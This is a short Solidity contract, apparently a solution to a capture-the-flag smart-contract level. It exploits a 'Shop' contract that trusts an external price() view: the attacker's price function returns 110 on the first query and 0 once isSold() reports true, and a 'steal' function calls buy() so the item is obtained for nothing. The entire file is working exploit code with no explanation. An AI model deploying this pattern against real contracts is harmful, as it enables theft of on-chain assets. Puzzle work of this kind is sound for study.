// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

interface Shop {
  function isSold() external view returns (bool);
  function buy() external;
}

contract Lift {
  function price() external view returns (uint) {
    bool sold = Shop(msg.sender).isSold();
    return sold ? 0 : 110;
  }

  function steal(address target) public {
    Shop(target).buy();
  }
}
